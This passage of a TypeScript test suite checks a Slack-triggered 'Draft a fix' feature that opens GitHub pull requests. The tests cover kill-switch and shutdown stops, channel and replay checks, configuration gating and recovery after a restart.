  const w = await flushed(setup({ model: fixModel({}, { stopAfter: stopFile }), engine: { stopFile } }));
  await w.click(w.issue.id);
  assert.deepEqual(w.r.branches(), ['main']);
  assert.match(String(fixEvents(w).at(-1)!.data.reason), /^the run was stopped/);
  assert.ok(!w.gh.calls.some((c) => c.method === 'POST' && c.path.endsWith('/pulls')));
});

test('the kill switch or a stop after the run still stops the push and the PR', async () => {
  // The kill switch while the engine commits: nothing is pushed.
  let a!: ReturnType<typeof setup>;
  a = await flushed(setup({ onGit: (args) => args.includes('commit') && writeFileSync(a.engine.stopFile, 'now\n') }));
  await a.click(a.issue.id);
  assert.deepEqual(a.r.branches(), ['main']);
  assert.ok(!a.gits.some((g) => g.includes('push')), 'no push');
  assert.equal(fixEvents(a).at(-1)!.data.reason, 'stopped: the kill switch is on');
  assert.deepEqual(a.replies.slice(1).map((r) => r[1]), [`No fix drafted for ${a.issue.id}: stopped: the kill switch is on. Nothing was pushed.`], 'one reply');

  // The kill switch while it pushes: no pull request.
  let b!: ReturnType<typeof setup>;
  b = await flushed(setup({ onGit: (args) => args.includes('push') && writeFileSync(b.engine.stopFile, 'now\n') }));
  await b.click(b.issue.id);
  assert.ok(!b.gh.calls.some((c) => c.method === 'POST' && c.path.endsWith('/pulls')), 'no PR');
  assert.equal(fixEvents(b).at(-1)!.data.reason, 'stopped: the kill switch is on');
  assert.match(b.replies.at(-1)![1], /^No draft pull request for I-[0-9a-f]+: stopped: the kill switch is on\. The branch agent-engine\/fix-I-[0-9a-f]+ is on GitHub\.$/);

  // The buttons stop (a shutdown) while it commits: nothing is pushed.
  let c!: ReturnType<typeof setup>;
  c = await flushed(setup({ onGit: (args) => args.includes('commit') && c.fixer.stop('the engine is shutting down') }));
  await c.click(c.issue.id);
  assert.deepEqual(c.r.branches(), ['main']);
  assert.equal(fixEvents(c).at(-1)!.data.reason, 'stopped: the engine is shutting down');
  assert.equal(c.issues.fix(c.issue.id), undefined, 'the button works again');
});

test('a PR already on GitHub for the branch is linked without a run; a branch without one is refused before any spend', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  const linked = await flushed(setup({ github: { prs: [{ head: `agent-engine/fix-${id}`, number: 55 }] } }));
  // setup() opens a fresh issue with the same id (same title and time), so the PR matches it.
  assert.equal(linked.issue.id, id);
  await linked.click(id);
  assert.equal(linked.session.requests.length, 0);
  assert.equal(linked.issues.fix(id)?.kind, 'drafted');
  assert.equal(String(fixEvents(linked).at(-1)!.data.url), 'https://github.com/starkfuture/backend/pull/55');

  git('--git-dir', w.r.bare, 'branch', `agent-engine/fix-${id}`, 'main');
  await w.click(id);
  assert.equal(w.session.requests.length, 0);
  assert.match(w.replies.at(-1)![1], /already on GitHub without a pull request; delete it and click again/);
});

// ---- the click ------------------------------------------------------------------------

test('a Draft a fix click goes through the same checks: our app, team and channel, Slack replays, and the update commits with it', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  for (const elsewhere of [{ channel: 'C0ELSEWHERE' }, { team: 'T0OTHERTEAM' }, { app: 'A0OTHERAPP' }]) {
    const r = onClick(payload(FIX_ACTION, id, elsewhere), w.ctx);
    assert.match(r.reply!, /only in the monitor channel\. Nothing changed\.$/);
    assert.equal(r.after, undefined);
  }
  assert.deepEqual(fixEvents(w), []);

  // The update can't be queued: the click is not recorded either.
  const raw = new DatabaseSync(w.db);
  raw.exec(`CREATE TRIGGER outbox_full BEFORE INSERT ON slack_outbox BEGIN SELECT RAISE(ABORT, 'disk full'); END`);
  assert.throws(() => onClick(payload(FIX_ACTION, id), w.ctx), /disk full/);
  assert.deepEqual(fixEvents(w), []);
  raw.exec(`DROP TRIGGER outbox_full`);

  // Slack delivers the same click twice: one request.
  const p = payload(FIX_ACTION, id, { user: 'U0ALICE' });
  const first = onClick(p, w.ctx);
  assert.ok(first.after);
  const replay = onClick(p, w.ctx);
  assert.equal(replay.reply, 'That click is already recorded. Nothing changed.');
  assert.equal(replay.after, undefined);
  const other = onClick(payload(FIX_ACTION, id, { user: 'U0BOB' }), w.ctx);
  assert.match(other.reply!, new RegExp(`^A fix for ${id} is already being drafted, asked by <@U0ALICE> at 08:00Z\\. Nothing changed\\.$`));
  assert.deepEqual(fixEvents(w).map((e) => e.type), ['fix_requested']);
});

test('no repo maps to the issue: the clicker is told, and nothing is recorded or updated', async () => {
  const w = setup();
  const keycloak = w.issues.open({ title: 'Keycloak token endpoint 500s', severity: 'major', rows: ['http|keycloak|/auth/realms/stark/token|500'], hypothesis: 'a realm cache is cold' }, at(1));
  w.box.enqueue({ kind: 'report', message: { text: 'kc', blocks: [] }, keys: keycloak.rows, broadcast: true, issue: keycloak.id });
  await w.box.flush();
  const p = { ...payload(FIX_ACTION, keycloak.id), container: { type: 'message', message_ts: '1700000000.000002', channel_id: IDS.channel, is_ephemeral: false } };
  const r = onClick(p, w.ctx);
  assert.equal(r.reply, 'No repo maps to this issue (config/fixes.yaml), so there is no fix to draft. Nothing changed.');
  assert.equal(r.after, undefined);
  assert.deepEqual(w.issues.events(keycloak.id).map((e) => e.type), ['opened']);
  assert.deepEqual(w.t.updates, []);
});

// ---- off unless configured ----------------------------------------------------------

test('off unless both GITHUB_FIX_APP_ID and GITHUB_FIX_APP_PRIVATE_KEY are set: no button, and a stray click changes nothing', async () => {
  const pem = privateKey.replace(/\n/g, '\\n');
  assert.equal(loadConfig({}).fixApp, undefined);
  assert.equal(loadConfig({ GITHUB_FIX_APP_ID: '4242' }).fixApp, undefined);
  assert.equal(loadConfig({ GITHUB_FIX_APP_PRIVATE_KEY: privateKey }).fixApp, undefined);
  assert.deepEqual(loadConfig({ GITHUB_FIX_APP_ID: '4242', GITHUB_FIX_APP_PRIVATE_KEY: privateKey }).fixApp, { appId: '4242', privateKey });
  assert.equal(loadConfig({ GITHUB_FIX_APP_ID: '4242', GITHUB_FIX_APP_PRIVATE_KEY: pem }).fixApp?.privateKey, privateKey, 'literal \\n from a secret store');

  const w = await flushed(setup({ fix: false }));
  assert.deepEqual(buttons(w.t.sent[0]!.blocks), [ACTION.acknowledged, ACTION.dismissed]);
  const r = onClick(payload(FIX_ACTION, w.issue.id), { issues: w.issues, outbox: w.box, ids: IDS, now: () => w.clock.now });
  assert.equal(r.reply, 'Draft a fix is off on this engine. Nothing changed.');
  assert.deepEqual(fixEvents(w), []);

  // On, but the issue resolved: no button.
  const on = await flushed(setup());
  on.issues.resolve(on.issue.id, at(5));
  on.box.updateRoot(on.issue.id);
  await on.box.flush();
  assert.deepEqual(buttons(on.t.updates.at(-1)!.blocks), []);
});

test('Socket Mode: a Draft a fix click whose ack Slack refused still starts its work', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  const handlers = new Map<string, (a: { body?: unknown; ack?: () => Promise<void> }) => void>();
  const client: SocketClient = { on: (e, f) => handlers.set(e, f), start: async () => {}, disconnect: async () => {} };
  const logs: string[] = [];
  const socket = startButtons({ appToken: 'xapp-1-A0TESTAPP-1-abcdef', appId: IDS.app, channel: IDS.channel, team: async () => IDS.team, issues: w.issues, outbox: w.box, log: (s) => logs.push(s), client: () => client, respond: async () => {}, now: () => w.clock.now, fix: w.fixer });
  await socket.ready;
  handlers.get('interactive')!({ body: payload(FIX_ACTION, id), ack: () => Promise.reject(new Error('socket closed')) });
  const ended = () => fixEvents(w).some((e) => e.type === 'fix_drafted' || e.type === 'fix_failed');
  for (let i = 0; i < 6000 && !ended(); i++) await new Promise((r) => setTimeout(r, 10));
  await socket.stop();
  assert.ok(logs.includes('buttons: Slack did not take the acknowledgement'));
  assert.equal(w.issues.fix(id)?.kind, 'drafted', 'dispatched anyway: a redelivery would be stale');
});

test('recovery ends a request that never started, but not one being drafted or just recorded', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  const first = onClick(payload(FIX_ACTION, id), w.ctx);
  const job = first.after!(); // being drafted in this process
  assert.deepEqual(w.fixer.recover({ olderThanMs: 0 }), [], 'its work is running');
  await job;
  assert.equal(w.issues.fix(id)?.kind, 'drafted');

  const other = setup();
  await other.box.flush();
  onClick(payload(FIX_ACTION, other.issue.id), other.ctx); // recorded; its dispatch never happens
  other.clock.now = at(10);
  assert.deepEqual(other.fixer.recover({ olderThanMs: 15 * 60_000 }), [], 'not yet: dispatch may still come');
  other.clock.now = at(16);
  assert.deepEqual(other.fixer.recover({ olderThanMs: 15 * 60_000 }), [other.issue.id]);
  assert.equal(fixEvents(other).at(-1)!.data.reason, 'it never started');
  assert.equal(other.issues.fix(other.issue.id), undefined, 'the button works again');
});

test('after a restart, a fix left half drafted ends and the button is back', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  onClick(payload(FIX_ACTION, id), w.ctx); // recorded; the process dies before the work
  await w.box.flush();
  assert.equal(w.issues.fix(id)?.kind, 'pending');
  assert.deepEqual(w.fixer.recover(), [id]);
  assert.equal(w.issues.fix(id), undefined);
  assert.equal(fixEvents(w).at(-1)!.data.reason, 'the engine restarted while drafting it');
  await w.box.flush();
  assert.ok(buttons(w.t.updates.at(-1)!.blocks).includes(FIX_ACTION));
  assert.deepEqual(w.fixer.recover(), []);
  assert.ok(existsSync(w.db));
});
